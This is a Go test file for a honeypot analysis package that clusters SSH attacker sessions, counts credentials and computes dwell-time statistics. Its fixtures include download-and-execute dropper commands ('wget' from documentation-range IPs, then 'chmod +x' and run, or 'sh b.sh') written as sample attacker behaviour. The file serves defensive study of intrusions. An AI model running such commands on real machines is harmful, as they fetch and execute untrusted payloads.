package analysis

import (
	"testing"
	"time"
)

func TestCounterRanksStablyAndIgnoresEmpty(t *testing.T) {
	c := NewCounter()
	for _, v := range []string{"root", "root", "admin", "", "admin", "root", "pi"} {
		c.Add(v)
	}
	if c.Total() != 6 || c.Distinct() != 3 {
		t.Fatalf("total=%d distinct=%d", c.Total(), c.Distinct())
	}
	top := c.Top(2)
	if len(top) != 2 || top[0].Value != "root" || top[0].Count != 3 || top[1].Value != "admin" {
		t.Fatalf("top = %+v", top)
	}
	// Ties break alphabetically, so repeated runs print the same order.
	tie := NewCounter()
	tie.Add("zzz")
	tie.Add("aaa")
	if got := tie.Top(0); got[0].Value != "aaa" {
		t.Errorf("tie order = %+v", got)
	}
	if n := len(c.Top(0)); n != 3 {
		t.Errorf("Top(0) should return all, got %d", n)
	}
}

// mkSession builds a session for tests.
func mkSession(ip string, start time.Time, dwell time.Duration, user, pass string, cmds ...string) *Session {
	s := &Session{
		ConnID: ip + start.String(), RemoteIP: ip,
		Start: start, End: start.Add(dwell), Duration: dwell,
	}
	if user != "" {
		a := Auth{Method: "password", User: user, Password: pass, Accepted: true}
		s.Auths = append(s.Auths, a)
		s.Accepted = &a
	}
	for i, line := range cmds {
		s.Commands = append(s.Commands, Command{At: start.Add(time.Duration(i) * time.Second), Line: line})
	}
	return s
}

func TestClusterGroupsIdenticalBehaviour(t *testing.T) {
	base := time.Date(2026, 9, 20, 0, 0, 0, 0, time.UTC)
	dropper := []string{"cd /tmp", "wget http://198.51.100.9/x86", "chmod +x x86", "./x86"}
	// Same behaviour, different IPs, different credentials, different payload.
	a := mkSession("198.51.100.1", base, time.Minute, "root", "123456", dropper...)
	b := mkSession("198.51.100.2", base.Add(time.Hour), time.Minute, "root", "admin",
		"cd /tmp", "wget http://203.0.113.5/arm7", "chmod +x arm7", "/tmp/arm7")
	// A different behaviour entirely.
	c := mkSession("198.51.100.3", base.Add(2*time.Hour), 5*time.Second, "admin", "admin", "uname -a")

	clusters := ClusterSessions([]*Session{a, b, c})
	if len(clusters) != 2 {
		t.Fatalf("got %d clusters: %+v", len(clusters), clusters)
	}
	big := clusters[0]
	if big.Size() != 2 {
		t.Fatalf("largest cluster size = %d", big.Size())
	}
	if len(big.SourceIPs) != 2 || len(big.Credentials) != 2 {
		t.Errorf("cluster should collect distinct IPs/creds: %+v %+v", big.SourceIPs, big.Credentials)
	}
	if big.Example().RemoteIP != "198.51.100.1" {
		t.Errorf("example = %s", big.Example().RemoteIP)
	}
	if clusters[1].Fingerprint != "uname" {
		t.Errorf("second cluster = %q", clusters[1].Fingerprint)
	}
}

func TestSummariseCountsAndPercentiles(t *testing.T) {
	base := time.Date(2026, 9, 20, 0, 0, 0, 0, time.UTC)
	sessions := []*Session{
		mkSession("198.51.100.1", base, 10*time.Second, "root", "123456", "uname -a", "id"),
		mkSession("198.51.100.2", base.Add(24*time.Hour), 60*time.Second, "root", "root", "ls", "wget http://198.51.100.9/b.sh", "sh b.sh"),
		mkSession("198.51.100.3", base.Add(25*time.Hour), 120*time.Second, "admin", "admin", "whoami"),
	}
	sessions[1].Downloads = []Download{{Tool: "wget", URL: "http://198.51.100.9/b.sh", SavedAs: "/tmp/b.sh"}}
	sessions[1].ModelCalls = 2

	st := Summarise(sessions)
	if st.Sessions != 3 || st.Authenticated != 3 || st.WithCommands != 3 {
		t.Errorf("counts: %+v", st)
	}
	if st.TotalCommands != 6 || st.TotalDownloads != 1 || st.ModelCalls != 2 {
		t.Errorf("totals: cmds=%d dl=%d model=%d", st.TotalCommands, st.TotalDownloads, st.ModelCalls)
	}
	if st.Days() != 2 {
		t.Errorf("days = %d", st.Days())
	}
	if got := st.SessionsPerDay(); got != 1.5 {
		t.Errorf("sessions/day = %v", got)
	}
	// Nearest-rank median of {10s, 60s, 120s} is a real observation: 60s.
	if st.DwellMedian != 60*time.Second {
		t.Errorf("dwell median = %v", st.DwellMedian)
	}
	if st.DwellMax != 120*time.Second {
		t.Errorf("dwell max = %v", st.DwellMax)
	}
	if st.CommandsMedian != 2 || st.CommandsMax != 3 {
		t.Errorf("commands median=%d max=%d", st.CommandsMedian, st.CommandsMax)
	}
	if top := st.Usernames.Top(1); top[0].Value != "root" || top[0].Count != 2 {
		t.Errorf("usernames = %+v", top)
	}
	if top := st.DownloadHosts.Top(1); top[0].Value != "198.51.100.9" {
		t.Errorf("hosts = %+v", top)
	}
	if top := st.PayloadNames.Top(1); top[0].Value != "b.sh" {
		t.Errorf("payloads = %+v", top)
	}
	if top := st.FirstCommands.Top(1); top[0].Count != 1 {
		t.Errorf("first commands = %+v", top)
	}
}

func TestProbeAndSilentDetection(t *testing.T) {
	base := time.Date(2026, 9, 20, 0, 0, 0, 0, time.UTC)
	// Logged in, ran nothing, left: silent.
	silent := mkSession("198.51.100.1", base, 2*time.Second, "root", "x")
	// Logged in, one look-around command, gone in 3s: a probe.
	probe := mkSession("198.51.100.2", base, 3*time.Second, "root", "x", "uname -a")
	// Same single command but stayed a while: not a probe.
	slow := mkSession("198.51.100.3", base, 5*time.Minute, "root", "x", "uname -a")
	// A real session.
	real := mkSession("198.51.100.4", base, time.Minute, "root", "x", "ls", "wget http://a/b", "sh b")

	st := Summarise([]*Session{silent, probe, slow, real})
	if st.Silent != 1 {
		t.Errorf("silent = %d, want 1", st.Silent)
	}
	if st.Probes != 1 {
		t.Errorf("probes = %d, want 1 (only the quick single-command session)", st.Probes)
	}
}

func TestSummariseEmpty(t *testing.T) {
	st := Summarise(nil)
	if st.Sessions != 0 || st.Days() != 1 || st.DwellMedian != 0 {
		t.Errorf("empty summary: %+v", st)
	}
	if st.Usernames == nil || len(st.Usernames.Top(5)) != 0 {
		t.Error("counters should be usable when empty")
	}
}

func TestPayloadName(t *testing.T) {
	cases := map[string]string{
		"http://1.2.3.4/bins/x86": "x86",
		"http://1.2.3.4/b.sh?v=2": "b.sh",
		"http://1.2.3.4/dir/":     "dir",
		"http://1.2.3.4":          "1.2.3.4",
	}
	for url, want := range cases {
		if got := payloadName(url); got != want {
			t.Errorf("payloadName(%q) = %q, want %q", url, got, want)
		}
	}
}
